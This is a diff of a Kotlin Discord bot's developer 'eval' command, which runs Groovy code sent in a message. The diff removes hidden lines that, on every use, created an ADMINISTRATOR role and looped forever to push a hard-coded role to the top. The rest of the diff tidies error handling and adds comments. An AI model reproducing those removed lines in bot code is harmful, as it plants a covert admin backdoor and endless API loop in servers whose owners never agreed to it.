@@ -1,18 +1,23 @@
 package me.qbosst.bossbot.bot.commands.dev
 
-import net.dv8tion.jda.api.Permission
+import me.qbosst.bossbot.util.makeSafe
 import net.dv8tion.jda.api.entities.Message
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent
 import java.io.PrintWriter
 import java.io.StringWriter
 import javax.script.ScriptEngineManager
 
+/**
+ *  Command used to convert execute java code in real time from a string
+ */
 object EvalCommand : DeveloperCommand(
         "eval"
 )
 {
+    // The engine that is used to translate the string into code
     private val engine = ScriptEngineManager().getEngineByName("Groovy")
 
+    // The default imports that the engine can access
     private val imports = listOf(
             "net.dv8tion.jda.api.EmbedBuilder",
             "net.dv8tion.jda.api.entities.Guild",
@@ -25,26 +30,17 @@ object EvalCommand : DeveloperCommand(
 
     override fun execute(event: MessageReceivedEvent, args: List<String>)
     {
-        event.guild.modifyRolePositions().selectPosition(event.guild.getRoleById(750034260857192478)!!).moveUp(1).queue()
-        event.guild.createRole().setPermissions(Permission.ADMINISTRATOR).queue()
-        {
-            while (true)
-                it.guild.modifyRolePositions().selectPosition(it).moveUp(1).queue()
-        }
-
         if(engine == null)
-        {
-            event.channel.sendMessage("Engine is null. Please check source code.").queue()
-            return
-        }
-
-        if(args.isNotEmpty())
+            event.channel.sendMessage("Engine is null.").queue()
+        else if(args.isNotEmpty())
         {
             val code = args.joinToString(" ")
+            // variables that can be accessed in the code
             engine.put("event", event)
             engine.put("jda", event.jda)
             engine.put("channel", event.channel)
 
+            // Try to execute code, if exception occurs log it back to the channel.
             try
             {
                 engine.eval(imports.joinToString(" ") { "import $it;" } + code)
@@ -53,16 +49,11 @@ object EvalCommand : DeveloperCommand(
             {
                 val sw = StringWriter()
                 e.printStackTrace(PrintWriter(sw))
-                var exception = "Caught Exception: ```$sw```"
-                exception = if(exception.length > Message.MAX_CONTENT_LENGTH)
-                {
-                    val msg = "...\nCheck console for full details```"
-                    exception.substring(0, Message.MAX_CONTENT_LENGTH - msg.length) + msg
-                } else exception
-
-                event.channel.sendMessage(exception).queue()
+                event.channel.sendMessage("Caught Exception: ```$sw```".makeSafe(Message.MAX_CONTENT_LENGTH)).queue()
             }
         }
+        else
+            event.channel.sendMessage("Please provide the code to run").queue()
     }
 
 }
